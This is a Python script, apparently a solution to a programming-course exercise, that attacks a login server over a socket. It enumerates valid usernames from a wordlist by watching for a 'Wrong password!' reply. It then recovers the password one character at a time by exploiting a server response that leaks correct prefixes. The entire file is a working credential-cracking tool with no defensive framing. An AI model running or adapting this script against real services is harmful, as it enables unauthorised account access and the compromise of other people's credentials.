import socket
from argparse import ArgumentParser
import itertools
import json

NUM = '0123456789'
L_CHAR = 'abcdefghijklmnopqrstuvwxyz'
U_CHAR = L_CHAR.upper()
CHAR = NUM + L_CHAR + U_CHAR


def convert_to_json(username, pw):
    """
    Convert the given username and password to JSON format
    :return: string in JSON format
    """
    return json.dumps({"login": username, "password": pw}, indent=4)


def response_info(info):
    """
    Pass login information and return response sentence
    :param info: username and password in JSON format
    :return: single response sentence
    """
    message = info.encode()
    client_connection.send(message)
    response = client_connection.recv(1024)
    response = response.decode()

    res_info = json.loads(response)["result"]
    return res_info


def find_login():
    """
    Read the login user file and return a generator
    :return: generator with all login users
    """
    with open('./logins.txt') as file:
        login_data = file.read().split('\n')
    for login in login_data:
        yield login


def find_password(username):
    """
    Find the right password for the user and return it
    :param username: correct login user
    :return: right password
    """
    pw = ''
    while True:
        for letter in CHAR:
            login_info = convert_to_json(username, pw + letter)
            res = response_info(login_info)

            if res == "Exception happened during login":
                pw += letter

            if res == "Connection success!":
                pw += letter
                return pw


parser = ArgumentParser()
parser.add_argument('host', type=str, help='The ip address of the sever you want to connect.')
parser.add_argument('port', type=int, help='The port of the sever you want to connect.')
args = parser.parse_args()

with socket.socket() as client_connection:
    address = (args.host, args.port)
    client_connection.connect(address)

    user_generator = find_login()
    for user in user_generator:
        login_info = convert_to_json(user, ' ')
        res = response_info(login_info)
        if res == "Wrong password!":
            login_user = user
            break

    login_pw = find_password(login_user)

    print(convert_to_json(login_user, login_pw))




